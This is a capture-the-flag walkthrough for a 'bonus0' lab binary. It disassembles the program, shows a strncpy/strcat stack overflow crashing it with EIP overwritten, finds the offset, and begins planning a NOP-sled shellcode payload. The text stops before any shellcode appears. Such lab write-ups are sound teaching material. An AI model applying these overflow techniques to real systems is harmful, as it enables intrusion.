# Bonus0

```bash
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
```


## Testing the program

```bash
$ ./bonus0 
 - 
a
 - 
hello
a hello
```

```bash
$ ./bonus0 
 - 
hello you
 - 
who are you
hello you who are you
```


Okay so we have a program that waits for two arguments then displays them concatened. 

## Learning more


```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:	push   %ebp
   0x080485a5 <+1>:	mov    %esp,%ebp
   0x080485a7 <+3>:	and    $0xfffffff0,%esp
   0x080485aa <+6>:	sub    $0x40,%esp
   0x080485ad <+9>:	lea    0x16(%esp),%eax
   0x080485b1 <+13>:	mov    %eax,(%esp)
   0x080485b4 <+16>:	call   0x804851e <pp>
   0x080485b9 <+21>:	lea    0x16(%esp),%eax
   0x080485bd <+25>:	mov    %eax,(%esp)
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:	mov    $0x0,%eax
   0x080485ca <+38>:	leave  
   0x080485cb <+39>:	ret    
End of assembler dump.
```



There is a call to a 'pp' function. 


```bash 
(gdb) disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>:	push   %ebp
   0x0804851f <+1>:	mov    %esp,%ebp
   0x08048521 <+3>:	push   %edi
   0x08048522 <+4>:	push   %ebx
   0x08048523 <+5>:	sub    $0x50,%esp
   0x08048526 <+8>:	movl   $0x80486a0,0x4(%esp)
   0x0804852e <+16>:	lea    -0x30(%ebp),%eax
   0x08048531 <+19>:	mov    %eax,(%esp)
   0x08048534 <+22>:	call   0x80484b4 <p>
   0x08048539 <+27>:	movl   $0x80486a0,0x4(%esp)
   0x08048541 <+35>:	lea    -0x1c(%ebp),%eax
   0x08048544 <+38>:	mov    %eax,(%esp)
   0x08048547 <+41>:	call   0x80484b4 <p>
   0x0804854c <+46>:	lea    -0x30(%ebp),%eax
   0x0804854f <+49>:	mov    %eax,0x4(%esp)
   0x08048553 <+53>:	mov    0x8(%ebp),%eax
   0x08048556 <+56>:	mov    %eax,(%esp)
   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:	mov    $0x80486a4,%ebx
   0x08048563 <+69>:	mov    0x8(%ebp),%eax
   0x08048566 <+72>:	movl   $0xffffffff,-0x3c(%ebp)
   0x0804856d <+79>:	mov    %eax,%edx
   0x0804856f <+81>:	mov    $0x0,%eax
   0x08048574 <+86>:	mov    -0x3c(%ebp),%ecx
   0x08048577 <+89>:	mov    %edx,%edi
   0x08048579 <+91>:	repnz scas %es:(%edi),%al
   0x0804857b <+93>:	mov    %ecx,%eax
   0x0804857d <+95>:	not    %eax
   0x0804857f <+97>:	sub    $0x1,%eax
   0x08048582 <+100>:	add    0x8(%ebp),%eax
   0x08048585 <+103>:	movzwl (%ebx),%edx
   0x08048588 <+106>:	mov    %dx,(%eax)
   0x0804858b <+109>:	lea    -0x1c(%ebp),%eax
   0x0804858e <+112>:	mov    %eax,0x4(%esp)
   0x08048592 <+116>:	mov    0x8(%ebp),%eax
   0x08048595 <+119>:	mov    %eax,(%esp)
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
   0x0804859d <+127>:	add    $0x50,%esp
   0x080485a0 <+130>:	pop    %ebx
   0x080485a1 <+131>:	pop    %edi
   0x080485a2 <+132>:	pop    %ebp
   0x080485a3 <+133>:	ret    
End of assembler dump.
```

The pp function : 
    • Calls a function "p" twice
    • Calls strcpy with values at addresses of esp and esp+4 --> strcpt(buffer, a)

```bash
(gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   %ebp
   0x080484b5 <+1>:	mov    %esp,%ebp
   0x080484b7 <+3>:	sub    $0x1018,%esp
   0x080484bd <+9>:	mov    0xc(%ebp),%eax
   0x080484c0 <+12>:	mov    %eax,(%esp)
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
   0x080484da <+38>:	movl   $0x0,(%esp)
   0x080484e1 <+45>:	call   0x8048380 <read@plt>. --> READS FROM esp, esp+4 and esp+8 which gives (read(0, buffer, 4096))
   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:	mov    %eax,(%esp)
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	movb   $0x0,(%eax)
   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
   0x08048505 <+81>:	movl   $0x14,0x8(%esp)
   0x0804850d <+89>:	mov    %eax,0x4(%esp)
   0x08048511 <+93>:	mov    0x8(%ebp),%eax
   0x08048514 <+96>:	mov    %eax,(%esp)
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt> --> strncpy(s, buffer, 20)
   0x0804851c <+104>:	leave  
   0x0804851d <+105>:	ret    
End of assembler dump.
```

The p function : 
    • Displays a string passed as a first argument. 
    • Reads up to 4096 bytes from the stdin into a local buffer
    • Delete the '\n' at the end of the input read
    • Call to strncpy() function with values at addresses of esp, esp+4 and esp+8 --> strncpy(s, buffer, 20)



## Getting acces to the pass 


```bash 
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa??? Aa0Aa1Aa2Aa3Aa4Aa5Aa???

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
(gdb) i r
eax            0x0	0
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff740	0xbffff740
ebp            0x32614131	0x32614131
esi            0x0	0
edi            0x0	0
eip            0x41336141	0x41336141
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 
```

0x41336141 --> Offset is 9. 

Let's figure out what our inputs must be. 
1st arg : We'll fill up the large buffer in p() with a padding of NOP instructions and our shellcode. The size of the padding doesn't matter because we just need to put a random address between the start address of our buffer[4096] (+61 bytes for args) and the end of our padding.